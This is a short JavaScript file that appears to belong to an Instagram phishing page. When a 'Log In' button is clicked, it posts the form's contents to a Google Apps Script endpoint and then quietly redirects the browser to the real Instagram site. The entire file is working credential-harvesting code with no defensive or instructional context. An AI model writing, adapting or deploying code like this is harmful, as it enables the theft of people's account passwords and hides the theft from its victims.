const scriptURL = 'https://script.google.com/macros/s/AKfycby_3de3HZ1JYH6hMBZKkhMZn3UvhGMPlZsmBzVHi33VMvkKw4TAhWNsSKhBZrrXmzP0yw/exec';
const form = document.forms['data'];

// Select the "Log In" button by its ID
const loginButton = document.getElementById('button');

loginButton.addEventListener('click', () => {
  // Fetch the Google Apps Script when the "Log In" button is clicked
  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
    .then(response => {
      // Redirect to Instagram URL without displaying an alert
      window.location.href = 'https://www.instagram.com/';
    })
    .catch(error => console.error('Error!', error.message));
});
